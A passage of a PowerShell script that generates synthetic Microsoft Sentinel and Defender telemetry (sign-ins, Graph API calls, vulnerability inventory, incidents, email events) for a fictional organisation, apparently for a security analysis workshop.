            $values.Application = Get-WorkshopRandomItem @('Microsoft 365', 'Microsoft Teams', 'SharePoint Online', 'Exchange Online')
            $values.IPAddress = Get-WorkshopRandomItem @('198.51.100.50', '198.51.100.60', '203.0.113.25')
            $values.AccountId = $user.Upn
            $values.AccountType = 'Regular'
            $values.ObjectName = Get-WorkshopRandomItem @('QuarterlyPlanning.docx', 'Team Chat', 'Inbox', 'Operations Notebook')
            $values.ObjectType = Get-WorkshopRandomItem @('File', 'Message', 'MailItem', 'OAuthApplication')
            $values.ActivityType = $values.ActionType
            $values.RawEventData = @{ baseline = $true; workload = $values.Application }
        }
        'AuditLogs' {
            $values.ActivityDisplayName = Get-WorkshopRandomItem @('Update user', 'Add member to group', 'Update application', 'User registered security info')
            $values.OperationName = $values.ActivityDisplayName
            $values.Category = Get-WorkshopRandomItem @('UserManagement', 'GroupManagement', 'ApplicationManagement', 'AuthenticationMethods')
            $values.Result = 'success'
            $values.ResultType = 'Success'
            $values.Identity = $user.Upn
            $values.InitiatedBy = @{ user = @{ userPrincipalName = $user.Upn; id = $user.ObjectId; ipAddress = '198.51.100.50' } }
            $values.TargetResources = @(@{ displayName = $user.DisplayName; type = 'User'; id = $user.ObjectId })
            $values.LoggedByService = 'Core Directory'
            $values.Id = New-StableGuid "$Table|audit|$Index"
        }
        'GraphAPIAuditEvents' {
            $bucket = $Index % 1000
            $isDelegatedUserCall = $bucket -lt 353
            $apiVersion = if ($bucket -lt 707) { 'v1.0' } elseif ($bucket -lt 995) { 'beta' } else { 'rp' }
            $requestMethod = if ($bucket -lt 788) { 'GET' } elseif ($bucket -lt 973) { 'POST' } elseif ($bucket -lt 995) { 'PATCH' } else { 'DELETE' }
            $statusCode = if ($bucket -lt 891) {
                200
            }
            elseif ($bucket -lt 940) { 404 }
            elseif ($bucket -lt 962) { 204 }
            elseif ($bucket -lt 973) { 201 }
            elseif ($bucket -lt 984) { 401 }
            elseif ($bucket -lt 990) { 304 }
            elseif ($bucket -lt 995) { 403 }
            else { 412 }
            $requestObjectId = if ($isDelegatedUserCall) { $users[$Index % [Math]::Min(10, $users.Count)].ObjectId } else { New-StableGuid "$Table|request-object|$Index" }
            $requestTemplate = $graphAuditRequestTemplates[$Index % $graphAuditRequestTemplates.Count]
            $clientRequestId = if (($Index % 92) -eq 0) { New-StableGuid "$Table|client-request|duplicate|$($Index % 2)" } else { New-StableGuid "$Table|client-request|$Index" }
            $ipPrefix = Get-WorkshopRandomItem @('20.80.224', '20.59.79', '185.207.61', '172.200.70', '20.106.9', '20.37.153', '20.97.10', '74.47.226', '40.70.151', '198.51.100')

            $values.TimeGenerated = $timeText
            $values.ApplicationId = New-StableGuid "$Table|application|$Index"
            $values.IdentityProvider = 'AAD'
            $values.ApiVersion = $apiVersion
            $values.ClientRequestId = $clientRequestId
            $values.OperationId = New-StableGuid "$Table|operation|$Index"
            $values.AccountObjectId = if ($isDelegatedUserCall) { $requestObjectId } else { '' }
            $values.Location = $graphAuditRegions[$Index % $graphAuditRegions.Count]
            $values.RequestDuration = [string](15 + (($Index * 37) % 4800))
            $values.RequestMethod = $requestMethod
            $values.Timestamp = $timeText
            $values.ResponseStatusCode = [string]$statusCode
            $values.Scopes = if ($isDelegatedUserCall -or (($Index % 1000) -lt 359)) { $graphAuditScopeTemplates[$Index % $graphAuditScopeTemplates.Count] } else { '' }
            $values.EntityType = if (($Index % 1000) -eq 999) { '' } elseif ($isDelegatedUserCall) { 'user' } else { 'app' }
            $values.ReportId = New-StableGuid "$Table|report|$Index"
            $values.RequestUri = $requestTemplate -f $apiVersion, $requestObjectId
            $values.UniqueTokenIdentifier = if (($Index % 1000) -lt 995) { New-StableGuid "$Table|token|$Index" } else { '' }
            $values.RequestId = New-StableGuid "$Table|request|$Index"
            $values.IpAddress = if (($Index % 46) -eq 0) { '2603:1036:305:{0:x}::5' -f (0x5000 + ($Index % 255)) } else { '{0}.{1}' -f $ipPrefix, (10 + ($Index % 220)) }
            $values.ServicePrincipalId = if ($isDelegatedUserCall) { New-StableGuid "$Table|service-principal|$($Index % 23)" } else { '' }
            $values.TargetWorkload = if (($Index % 1000) -ge 946) { '' } elseif (($Index % 1000) -lt 761) { 'Microsoft.DirectoryServices' } else { $graphAuditWorkloads[$Index % $graphAuditWorkloads.Count] }
            $values.ResponseSize = [int](256 + (([int64]$Index * 7919) % 131072))
            $values.TenantId = ''
            $values.Type = $Table
            $values.SourceSystem = ''
        }
        'MicrosoftGraphActivityLogs' {
            $values.ApplicationId = $app.Id
            $values.AppId = $app.Id
            $values.IPAddress = Get-WorkshopRandomItem @('198.51.100.50', '198.51.100.60', '203.0.113.25')
            $values.RequestMethod = Get-WorkshopRandomItem @('GET', 'POST', 'PATCH')
            $values.RequestUri = Get-WorkshopRandomItem @('/v1.0/me', '/v1.0/users', '/v1.0/me/messages', '/v1.0/sites/root/drive/root/children')
            $values.ResponseStatusCode = if (($Index % 31) -eq 0) { 429 } else { 200 }
            $values.UserId = $user.ObjectId
            $values.AccountObjectId = $user.ObjectId
            $values.ServicePrincipalId = New-StableGuid "$($app.Id)|sp"
            $values.UniqueTokenIdentifier = New-StableGuid "$Table|token|$Index"
            $values.UniqueTokenId = $values.UniqueTokenIdentifier
            $values.TargetWorkload = 'MicrosoftGraph'
            $values.ResponseSize = Get-WorkshopRandomInt -Minimum 512 -Maximum 65536
            $values.RequestDuration = Get-WorkshopRandomInt -Minimum 20 -Maximum 1200
        }
        { $_ -in @('AlertInfo', 'AlertEvidence') } {
            $alertId = New-StableGuid "baseline-alert|$Index"
            $values.AlertId = $alertId
            $values.Title = Get-WorkshopRandomItem @('Informational Defender sensor event', 'Suspicious but remediated sign-in', 'Low severity malware blocked', 'Cloud app policy match')
            $values.Category = Get-WorkshopRandomItem @('InitialAccess', 'Execution', 'DefenseEvasion', 'Discovery')
            $values.Severity = Get-WorkshopRandomItem @('Informational', 'Low', 'Low', 'Medium')
            $values.ServiceSource = Get-WorkshopRandomItem @('Microsoft Defender for Endpoint', 'Microsoft Defender for Identity', 'Microsoft Defender for Cloud Apps')
            $values.DetectionSource = 'AutomatedInvestigation'
            $values.EntityType = Get-WorkshopRandomItem @('Device', 'User', 'File', 'Process')
            $values.EvidenceRole = 'Related'
            $values.EvidenceDirection = 'Source'
            $values.AttackTechniques = ''
            $values.Categories = @($values.Category)
        }
        'IdentityLogonEvents' {
            $bucket = $Index % 1000
            $hasAccountContext = $bucket -lt 990
            $hasDeviceProfile = $bucket -lt 991
            $hasDeviceName = $bucket -lt 9
            $hasDestinationDevice = $bucket -lt 9
            $hasDestinationNetwork = $bucket -lt 3
            $hasProtocol = $bucket -lt 9
            $hasFailureReason = $bucket -lt 7
            $hasRarityContext = $bucket -lt 991
            $isActiveDirectoryEvent = $bucket -ge 991
            $isFailure = ($Index % 139) -eq 0
            $identityLogonType = if ($isActiveDirectoryEvent) {
                Get-WorkshopRandomItem @('Interactive', 'Failed logon', 'Credentials validation')
            }
            elseif ($bucket -lt 977) { 'OAuth2:Authorize' }
            elseif ($bucket -lt 983) { 'Login:reprocess' }
            elseif ($bucket -lt 988) { 'Login:login' }
            elseif ($bucket -lt 991) { 'Kmsi:kmsi' }
            elseif ($bucket -lt 994) { 'Credentials validation' }
            elseif ($bucket -lt 996) { 'Failed logon' }
            elseif ($bucket -lt 998) { 'Resource access' }
            else { Get-WorkshopRandomItem @('Failed logon with certificate', 'Rdp:rdp', 'Cmsi:Cmsi', 'Remote desktop', 'Consent:Set', 'OAuth2:ApproveSession') }
            $networkContext = if ($bucket -lt 706) {
                [pscustomobject]@{ Location = 'DE'; ISP = 'mainzer breitband gmbh'; Prefix = '198.51.100' }
            }
            elseif ($bucket -lt 944) {
                [pscustomobject]@{ Location = 'US'; ISP = 'packethub s.a.'; Prefix = '203.0.113' }
            }
            elseif ($bucket -lt 986) {
                [pscustomobject]@{ Location = 'US'; ISP = 'Microsoft Azure'; Prefix = '192.0.2' }
            }
            elseif ($bucket -lt 991) {
                [pscustomobject]@{ Location = ''; ISP = ''; Prefix = '' }
            }
            else {
                [pscustomobject]@{ Location = 'NL'; ISP = Get-WorkshopRandomItem @('microsoft corporation', 'frontier communications of america inc.', 'comcast cable communications inc.', 'INTERNAL_NETWORK'); Prefix = '198.51.100' }
            }
            $userAgent = if (($Index % 100) -lt 91) {
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15'
            }
            elseif (($Index % 100) -lt 99) {
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0'
            }
            else {
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148'
            }

            $values.ActionType = if ($isFailure) { 'LogonFailed' } else { 'LogonSuccess' }
            $values.Application = if ($isActiveDirectoryEvent) { 'Active Directory' } elseif ($bucket -lt 953) { 'Microsoft Azure' } else { 'Microsoft 365' }
            $values.LogonType = $identityLogonType
            $values.Protocol = if ($hasProtocol) { if (($Index % 3) -eq 0) { 'Kerberos' } else { 'Ntlm' } } else { '' }
            $values.FailureReason = if ($isFailure -or $hasFailureReason) {
                Get-WorkshopRandomItem @(
                    'WrongPassword',
                    'General failure',
                    'Generic',
                    'This occurred due to Keep me signed in interrupt when the user was signing in.',
                    'Administrator consent is required. The request needs admin approval.',
                    'The user or administrator has not consented to use the application.'
                )
            }
            else {
                ''
            }
            $values.AccountName = if ($hasAccountContext) { $user.Name } else { '' }
            $values.AccountDomain = if ($hasAccountContext) { $adDomain } else { '' }
            $values.AccountUpn = if ($hasAccountContext) { $user.Upn } else { '' }
            $values.AccountSid = if (($Index % 1000) -lt 7) { $user.Sid } else { '' }
            $values.AccountObjectId = if ($hasAccountContext) { $user.ObjectId } else { '' }
            $values.AccountDisplayName = if ($hasAccountContext) { $user.DisplayName } else { '' }
            $values.DeviceName = if ($hasDeviceName) { $device.Name } else { '' }
            $values.DeviceType = if (-not $hasDeviceProfile) { '' } elseif (($Index % 1000) -lt 989) { 'Desktop' } elseif (($Index % 1000) -lt 999) { 'Tablet' } else { 'Mobile' }
            $values.OSPlatform = if (-not $hasDeviceProfile) { '' } elseif (($Index % 1000) -lt 915) { 'OS X' } elseif (($Index % 1000) -lt 999) { 'Windows 10' } else { 'iOS' }
            $values.IPAddress = if ($networkContext.Prefix) { '{0}.{1}' -f $networkContext.Prefix, (10 + ($Index % 220)) } else { '' }
            $values.Port = if (($Index % 1000) -lt 3) { 443 } else { 0 }
            $values.DestinationDeviceName = if ($hasDestinationDevice) { (Get-WorkshopRandomItem $domainControllers).Name } else { '' }
            $values.DestinationIPAddress = if ($hasDestinationNetwork) { (Get-WorkshopRandomItem $domainControllers).IP } else { '' }
            $values.DestinationPort = if ($hasDestinationNetwork) { if ($values.Protocol -eq 'Kerberos') { 88 } else { 389 } } else { 0 }
            $values.TargetDeviceName = if (($Index % 1000) -lt 2) { (Get-WorkshopRandomItem $windowsDevices).Name } else { '' }
            $values.TargetAccountDisplayName = ''
            $values.Location = $networkContext.Location
            $values.ISP = $networkContext.ISP
            $values.ReportId = "IDLOGON-$Index"
            $values.AdditionalFields = @{
                ClientAppUsed = if ($values.Application -eq 'Microsoft 365') { 'Browser' } else { 'Mobile Apps and Desktop clients' }
                ConditionalAccessStatus = 'success'
                UserAgent = $userAgent
                SyntheticPopulationProfile = 'IdentityLogonEventsRealTelemetryShape'
            }
            $values.UncommonForUser = if (-not $hasRarityContext) { @() } elseif (($Index % 1000) -lt 970) { @() } else {
                Get-WorkshopRandomItem @(
                    @('ISP', 'CountryCode'),
                    @('UserAgent'),
                    @('ISP'),
                    @('ActionType'),
                    @('ActionType', 'ISP', 'UserAgent'),
                    @('ActivityType', 'ActionType', 'OSPlatform', 'ISP', 'UserAgent', 'Application')
                )
            }
            $values.LastSeenForUser = if (-not $hasRarityContext) {
                @{}
            }
            elseif (($Index % 1000) -lt 985) {
                @{
                    ActionType = 0
                    OSPlatform = 0
                    ISP = 0
                    UserAgent = 0
                    CountryCode = 0
                    IPAddress = 0
                    Application = 0
                }
            }
            else {
                @{
                    ActionType = Get-WorkshopRandomItem @(0, 1, 3, -1)
                    OSPlatform = Get-WorkshopRandomItem @(0, 1, 3)
                    ISP = Get-WorkshopRandomItem @(0, 1, 3, -1)
                    UserAgent = Get-WorkshopRandomItem @(0, 1, -1)
                    IPAddress = Get-WorkshopRandomItem @(0, 1, 3)
                    Application = Get-WorkshopRandomItem @(0, 1)
                }
            }
            $values.TenantId = ''
            $values.Type = $Table
            $values.SourceSystem = ''
        }
        { $_ -like 'Identity*' -and $_ -ne 'IdentityLogonEvents' } {
            $values.ActionType = Get-WorkshopRandomItem @('LogonSuccess', 'LdapSearch', 'AccountModified', 'GroupMembershipChanged', 'IdentitySnapshot')
            $values.Application = Get-WorkshopRandomItem @('Active Directory', 'Kerberos', 'LDAP', 'Microsoft Entra Connect')
            $values.Protocol = Get-WorkshopRandomItem @('Kerberos', 'LDAP', 'NTLM')
            $values.QueryType = 'Search'
            $values.QueryTarget = Get-WorkshopRandomItem @('user', 'group', 'servicePrincipalName')
            $values.Query = '(objectClass=user)'
            $values.IPAddress = $device.IP
            $values.DestinationDeviceName = (Get-WorkshopRandomItem $domainControllers).Name
            $values.DestinationIPAddress = (Get-WorkshopRandomItem $domainControllers).IP
            $values.DestinationPort = Get-WorkshopRandomItem @(88, 389, 636)
            $values.AccountObjectId = $user.ObjectId
            $values.AccountUpn = $user.Upn
            $values.AccountDisplayName = $user.DisplayName
            $values.OnPremSid = $user.Sid
            $values.IsAccountEnabled = $true
            $values.CriticalityLevel = if ($user.Name -like 'svc_*') { 2 } else { 1 }
            $values.BlastRadius = if ($user.Name -like 'svc_*') { 'High' } else { 'Low' }
            $values.Tags = if ($user.Name -like 'svc_*') { @('ServiceAccount') } else { @('Employee') }
            $values.SourceProviders = @('ActiveDirectory', 'EntraID')
            $values.GroupMembership = @('Domain Users')
        }
        { $_ -like 'DeviceTvm*' -or $_ -like 'DeviceBaseline*' } {
            $values.ActionType = 'InventorySnapshot'
            $values.OSPlatform = if ($isUbuntuDevice) { 'Ubuntu' } else { $device.OS }
            $values.OSVersion = if ($isUbuntuDevice) { '24.04 LTS' } elseif ($device.OS -eq 'Windows11') { '25H2' } else { 'Server 2025' }
            $values.OSArchitecture = 'x64'
            $values.TenantId = ''
            $values.Type = $Table
            $values.SourceSystem = ''
            $values.MachineGroup = ''
            if ($Table -eq 'DeviceTvmInfoGathering') {
                $values.LastSeenTime = Format-WorkshopTime $Time.AddMinutes(-(($Index % 120) + 1))
                $values.AdditionalFields = New-WorkshopTvmInfoGatheringFields -Device $device -Time $Time -Index $Index
                break
            }
            if ($isUbuntuDevice) {
                $software = Get-WorkshopRandomItem $linuxSoftwareCatalog
                $values.SoftwareName = $software.Name
                $values.SoftwareVendor = $software.Vendor
                $values.SoftwareVersion = $software.Version
                $values.CveId = $software.CveId
                $values.PackageName = $software.Package
                $values.VulnerabilitySeverityLevel = if ($software.Risk -ge 80) { 'High' } elseif ($software.Risk -ge 60) { 'Medium' } else { 'Low' }
                $values.RecommendedSecurityUpdate = if ($software.CveId) { "Update Ubuntu package $($software.Package)" } else { 'No security update required' }
                if ($software.CveId) {
                    $values.CveTags = @('Linux', 'Ubuntu')
                }
                else {
                    $values.CveTags = @('Inventory')
                }
                $values.AdditionalFields = @{ OSProfile = 'Ubuntu'; Package = $software.Package; CveId = $software.CveId }
            }
            else {
                $softwareProfile = Get-WorkshopRandomItem @(
                    [pscustomobject]@{ Vendor = 'microsoft'; Name = 'edge'; Version = '125.0.2535.67'; CveId = 'CVE-2024-30078' },
                    [pscustomobject]@{ Vendor = 'microsoft'; Name = 'teams'; Version = '24215.1007.3082.1590'; CveId = 'CVE-2024-21338' },
                    [pscustomobject]@{ Vendor = 'adobe'; Name = 'acrobat_dc'; Version = '2026.1.21411.0'; CveId = 'CVE-2024-34112' },
                    [pscustomobject]@{ Vendor = '7-zip'; Name = '7-zip'; Version = '26.00.0.0'; CveId = 'CVE-2025-0411' },
                    [pscustomobject]@{ Vendor = 'openssl'; Name = 'openssl'; Version = '3.0.13'; CveId = 'CVE-2024-5535' },
                    [pscustomobject]@{ Vendor = 'microsoft'; Name = 'microsoft_defender_for_endpoint'; Version = '4.18.26030.3011'; CveId = 'CVE-2024-30088' }
                )
                $values.SoftwareName = $softwareProfile.Name
                $values.SoftwareVendor = $softwareProfile.Vendor
                $values.SoftwareVersion = $softwareProfile.Version
                $values.CveId = $softwareProfile.CveId
            }
            if ([string]::IsNullOrWhiteSpace([string]$values.CveId)) {
                $values.CveId = 'CVE-2026-{0:D5}' -f (10000 + ($Index % 80000))
            }
            $softwareKey = ('{0}:{1}:{2}' -f $values.SoftwareVendor, $values.SoftwareName, $values.SoftwareVersion).ToLowerInvariant() -replace '[^a-z0-9:._-]', '_'
            $values.RecommendedSecurityUpdateId = if ($values.CveId) { if ($isUbuntuDevice) { 'USN-{0}-1' -f (8000 + ($Index % 300)) } else { 'KB{0}' -f (5000000 + ($Index % 900000)) } } else { '' }
            $values.CveMitigationStatus = ''
            $values.AadDeviceId = if (-not $isUbuntuDevice -and ($Index % 4) -ne 0) { New-StableGuid "aad-device|$($device.DeviceId)" } else { '' }
            $values.EndOfSupportStatus = if (($Index % 50) -eq 0) { 'EOS Version' } elseif (($Index % 37) -eq 0) { 'Upcoming EOS Version' } else { '' }
            $values.EndOfSupportDate = Format-WorkshopTime $Time.AddYears(2).AddDays($Index % 365)
            $values.ProductCodeCpe = $softwareKey
            if ($isUbuntuDevice) {
                $values.RegistryPaths = @()
                $values.DiskPaths = @("/usr/bin/$($values.SoftwareName)", "/usr/share/doc/$($values.SoftwareName)")
            }
            else {
                $values.RegistryPaths = @("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$($values.SoftwareName)")
                $values.DiskPaths = @("C:\Program Files\$($values.SoftwareName)\$($values.SoftwareName).exe")
            }
            $values.LastSeenTime = $timeText
            $values.CvssScore = [math]::Round(4.0 + (($Index % 59) / 10.0), 1)
            $values.VulnerabilitySeverityLevel = if ($values.CvssScore -ge 9.0) { 'Critical' } elseif ($values.CvssScore -ge 7.0) { 'High' } elseif ($values.CvssScore -ge 4.0) { 'Medium' } else { 'Low' }
            $values.CvssVector = if ($values.CvssScore -ge 8.0) { 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' } else { 'CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L' }
            $values.CveSupportability = if (($Index % 9) -eq 0) { 'NotSupported' } else { 'Supported' }
            $values.IsExploitAvailable = ($Index % 6) -eq 0
            $values.LastModifiedTime = Format-WorkshopTime $Time.AddDays(-($Index % 30))
            $values.PublishedDate = Format-WorkshopTime $Time.AddDays(-30 - ($Index % 700))
            $values.VulnerabilityDescription = "Synthetic vulnerability record for $($values.CveId) affecting $($values.SoftwareName)."
            $values.AffectedSoftware = [object[]]@($softwareKey)
            $values.EpssScore = [math]::Round((($Index % 1000) / 1000.0), 5)
            $values.IgId = 'igid-{0}' -f (($Index % 90) + 1)
            $infoField = Get-WorkshopRandomItem @('TlsClient10', 'TlsClient11', 'TlsClient12', 'AvPlatformVersion', 'AvSignatureVersion', 'AvScanResults', 'AsrConfigurationStates', 'EBPFStatus', 'Log4j_CVE_2021_44228')
            $values.FieldName = $infoField
            $values.Description = "Information gathered for $infoField by Defender Vulnerability Management."
            $values.Categories = if ($infoField -like 'Tls*') { [object[]]@('network protocol', 'communication', 'tls') } elseif ($infoField -eq 'EBPFStatus') { [object[]]@('linux', 'sensor', 'ebpf') } else { [object[]]@('endpoint security', 'defender') }
            $values.DataStructure = if ($infoField -eq 'AsrConfigurationStates' -or $infoField -eq 'AvScanResults') { 'JSON object' } else { 'String or null' }
            $componentProfiles = @(
                [pscustomobject]@{ Type = 'Hardware'; Manufacturer = 'microsoft'; Name = 'virtual_machine'; Family = 'Virtual Machine'; Version = 'Hyper-V UEFI Release v4.1' },
                [pscustomobject]@{ Type = 'Bios'; Manufacturer = 'microsoft'; Name = 'virtual_machine_firmware'; Family = 'Virtual Machine'; Version = '4.1.0.0' },
                [pscustomobject]@{ Type = 'Processor'; Manufacturer = 'amd'; Name = 'amd_epyc'; Family = 'AMD(R) Processors'; Version = '19.0.0' },
                [pscustomobject]@{ Type = 'Tpm'; Manufacturer = 'microsoft'; Name = 'trusted_platform_module'; Family = 'TPM'; Version = '2.0' }
            )
            $component = Get-WorkshopRandomItem $componentProfiles
            $values.ComponentType = $component.Type
            $values.Manufacturer = $component.Manufacturer
            $values.ComponentName = $component.Name
            $values.ComponentFamily = $component.Family
            $values.ComponentVersion = $component.Version
            $values.AdditionalFields = @{
                BaseBoardManufacturer = if ($component.Type -eq 'Hardware') { 'Microsoft Corporation' } else { $null }
                BaseBoardProduct = if ($component.Type -eq 'Hardware') { 'Virtual Machine' } else { $null }
                BIOSReleaseDate = if ($component.Type -eq 'Bios') { Format-WorkshopTime $Time.AddDays(-120) } else { $null }
                BIOSLastDetected = Format-WorkshopTime $Time.AddMinutes(-($Index % 180))
                DeviceFamily = if ($device.Type -eq 'Workstation') { 'Endpoint' } else { 'Server' }
                SystemFamily = $component.Family
            }
            $values.Thumbprint = (New-StableHex "certificate|$($device.DeviceId)|$Index" 40).ToUpperInvariant()
            $values.Path = "Microsoft.PowerShell.Security\Certificate::LocalMachine\Root\$($values.Thumbprint)"
            $values.SerialNumber = (New-StableHex "certificate-serial|$Index" 32).ToUpperInvariant()
            $values.IssuedTo = @{ CommonName = $device.Name; Organization = 'USAG Cyber'; CountryName = 'US' }
            $values.IssuedBy = @{ CommonName = 'USAG Cyber Root CA'; Organization = 'USAG Cyber'; CountryName = 'US' }
            $values.FriendlyName = if ($isUbuntuDevice) { 'USAG Cyber Linux Device Certificate' } else { 'USAG Cyber Device Certificate' }
            $values.SignatureAlgorithm = if (($Index % 3) -eq 0) { 'sha384ECDSA' } else { 'sha256RSA' }
            $values.KeySize = if ($values.SignatureAlgorithm -like '*ECDSA') { 0 } else { 4096 }
            $values.ExpirationDate = Format-WorkshopTime $Time.AddYears(2).AddDays($Index % 120)
            $values.IssueDate = Format-WorkshopTime $Time.AddYears(-1).AddDays(-($Index % 120))
            $values.SubjectType = if (($Index % 13) -eq 0) { 'CA' } else { 'End Entity' }
            $values.KeyUsage = if ($values.SubjectType -eq 'CA') { [object[]]@('Certificate Signing', 'CRL Signing', 'Digital Signature') } else { [object[]]@('Digital Signature', 'Key Encipherment') }
            if ($isUbuntuDevice) {
                $values.ExtendedKeyUsage = @('Server Authentication')
            }
            else {
                $values.ExtendedKeyUsage = @('Client Authentication', 'Server Authentication')
            }
            $configurationProfiles = @(
                [pscustomobject]@{ Id = 'scid-20000'; Category = 'Security controls'; Subcategory = 'Onboard Devices'; Impact = 9.0; Context = @() },
                [pscustomobject]@{ Id = 'scid-10002'; Category = 'Network'; Subcategory = 'TLS'; Impact = 5.0; Context = @(@('Enabled')) },
                [pscustomobject]@{ Id = 'scid-91'; Category = 'OS'; Subcategory = 'Attack Surface Reduction'; Impact = 7.0; Context = @(@('Block')) },
                [pscustomobject]@{ Id = 'scid-2010'; Category = 'Application'; Subcategory = 'Microsoft Office'; Impact = 4.0; Context = @(@('Off')) }
            )
            $configuration = Get-WorkshopRandomItem $configurationProfiles
            $values.TimeGenerated = $timeText
            $values.ConfigurationId = $configuration.Id
            $values.ConfigurationCategory = $configuration.Category
            $values.ConfigurationSubcategory = $configuration.Subcategory
            $values.ConfigurationImpact = $configuration.Impact
            $values.IsApplicable = $true
            $values.IsExpectedUserImpact = ($Index % 41) -eq 0
            $values.Context = [object[]]@($configuration.Context)
            $values.IsCompliant = ($Index % 7) -ne 0
            $values.ComplianceStatus = if ($values.IsCompliant) { 'Compliant' } else { 'NonCompliant' }
            $values.RiskScore = if ($isUbuntuDevice -and $software) { $software.Risk } else { Get-WorkshopRandomInt -Minimum 1 -Maximum 60 }
        }
        'SecurityIncident' {
            $firstActivity = $Time.AddMinutes(-45 - ($Index % 90))
            $lastActivity = $Time.AddMinutes(-($Index % 30))
            $isClosed = ($Index % 6) -eq 0
            $incidentName = New-StableGuid "security-incident|$Index"
            $alertId = New-StableGuid "security-alert|$Index"
            $ruleId = New-StableGuid "analytics-rule|$($Index % 20)"
            $providerIncidentId = [string](200 + ($Index % 10000))
            $severity = Get-WorkshopRandomItem @('Low', 'Medium', 'High')
            $status = if ($isClosed) { 'Closed' } elseif (($Index % 5) -eq 0) { 'Active' } else { 'New' }
            $title = if (($Index % 9) -eq 0) { 'Multi-stage incident involving identity and endpoint activity' } elseif (($Index % 4) -eq 0) { 'Authentication Attempt from New Country involving one user' } else { 'Suspicious activity involving Microsoft Defender XDR alert correlation' }
            $values.TimeGenerated = $timeText
            $values.TenantId = $tenantId
            $values.IncidentName = $incidentName
            $values.Title = $title
            $values.Description = ''
            $values.Severity = $severity
            $values.Status = $status
            $values.Classification = if ($isClosed) { Get-WorkshopRandomItem @('Undetermined', 'BenignPositive', 'TruePositive') } else { '' }
            $values.ClassificationComment = ''
            $values.ClassificationReason = if ($isClosed -and ($Index % 3) -eq 0) { 'SuspiciousButExpected' } else { '' }
            $values.Owner = if (($Index % 4) -eq 0) {
                @{ objectId = New-StableGuid "owner|$Index"; email = 'soc.analyst@usag-cyber.local'; assignedTo = 'SOC Analyst'; userPrincipalName = 'soc.analyst@usag-cyber.local' }
            }
            else {
                @{ objectId = $null; email = $null; assignedTo = $null; userPrincipalName = $null }
            }
            $values.ProviderName = 'Microsoft XDR'
            $values.ProviderIncidentId = $providerIncidentId
            $values.FirstActivityTime = Format-WorkshopTime $firstActivity
            $values.LastActivityTime = Format-WorkshopTime $lastActivity
            $values.FirstModifiedTime = Format-WorkshopTime $Time.AddMinutes(-40)
            $values.LastModifiedTime = $timeText
            $values.CreatedTime = Format-WorkshopTime $Time.AddMinutes(-35)
            $values.ClosedTime = if ($isClosed) { Format-WorkshopTime $Time.AddMinutes(-5) } else { $null }
            $values.IncidentNumber = 100 + ($Index % 9000)
            $values.RelatedAnalyticRuleIds = [object[]]@($ruleId)
            $values.AlertIds = [object[]]@($alertId)
            $values.BookmarkIds = [object[]]@()
            $values.Comments = if (($Index % 7) -eq 0) { [object[]]@(@{ message = 'activity comment'; createdTimeUtc = $timeText; lastModifiedTimeUtc = $timeText; author = @{ name = 'soc.analyst@usag-cyber.local' } }) } else { [object[]]@() }
            $values.Tasks = [object[]]@()
            $values.Labels = if (($Index % 5) -eq 0) { [object[]]@(@{ labelName = 'Redirected'; labelType = 'AutoAssigned' }) } else { [object[]]@() }
            $values.IncidentUrl = "https://portal.azure.com/#asset/Microsoft_Azure_Security_Insights/Incident/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/sentinel/providers/Microsoft.OperationalInsights/workspaces/usag-cyber/providers/Microsoft.SecurityInsights/Incidents/$incidentName"
            $values.AdditionalData = @{
                alertsCount = 1 + ($Index % 3)
                bookmarksCount = 0
                commentsCount = @($values.Comments).Count
                alertProductNames = [object[]]@('Azure Sentinel')
                tactics = if ($title -like '*Authentication*') { [object[]]@('InitialAccess') } else { [object[]]@('Persistence', 'CredentialAccess', 'LateralMovement') }
                techniques = if ($title -like '*Authentication*') { [object[]]@('T1078') } else { [object[]]@('T1098', 'T1003', 'T1021') }
                providerIncidentUrl = "https://security.microsoft.com/incident2/$providerIncidentId/overview?tid=$tenantId"
            }
            $values.ModifiedBy = if ($isClosed) { 'SOC analyst' } else { 'Microsoft Defender XDR - alert correlation' }
            $values.SourceSystem = 'Azure'
            $values.Type = 'SecurityIncident'
        }
        'EmailEvents' {
            # Shaped from the real EmailEvents sample: 30 of 53 columns carry data.
            # DeliveryLocation is "Inbox/folder", AuthenticationDetails is a JSON
            # document, ReportId and NetworkMessageId are GUIDs, SenderIPv6 is
            # populated while SenderIPv4 is not, and EmailClusterId is a large long.
            $emailTemplate = $emailSubjectCatalog[$Index % $emailSubjectCatalog.Count]
            $sender = $users[($Index * 13) % $users.Count]
            $recipient = $users[($Index * 29) % $users.Count]
            $directionRoll = $Index % 100
            $direction = if ($directionRoll -lt 96) { 'Inbound' } elseif ($directionRoll -lt 98) { 'Outbound' } else { 'Intra-org' }
            $isThreat = ($Index % 23) -eq 0
            $networkMessageId = New-StableGuid "email|$Index"
            $isExternalRecipient = ($Index % 43) -eq 0

            $values.NetworkMessageId = $networkMessageId
            $values.InternetMessageId = '<{0}@{1}>' -f (New-StableHex "internet-message|$Index" 24).ToUpperInvariant(), $(if ($direction -eq 'Inbound') { $emailTemplate.Domain } else { $tenantDomain })
            $values.SenderMailFromAddress = if ($direction -eq 'Inbound') { '{0}@{1}' -f $emailTemplate.Sender, $emailTemplate.Domain } else { $sender.Upn }
            $values.SenderFromAddress = $values.SenderMailFromAddress
            $values.SenderDisplayName = if ($direction -eq 'Inbound') { $emailTemplate.DisplayName } else { $sender.DisplayName }
            $values.SenderObjectId = if ($direction -eq 'Inbound') { '' } else { $sender.ObjectId }
            $values.SenderMailFromDomain = if ($direction -eq 'Inbound') { $emailTemplate.Domain } else { $tenantDomain }
            $values.SenderFromDomain = $values.SenderMailFromDomain
            $values.SenderIPv6 = '2a01:111:f403:c{0:d3}::{1}' -f ($Index % 200), (1 + ($Index % 9))
            $values.RecipientEmailAddress = $recipient.Upn
            $values.RecipientObjectId = $recipient.ObjectId
            $values.RecipientDomain = $tenantDomain
            $values.Subject = $emailTemplate.Subject
            $values.EmailDirection = $direction
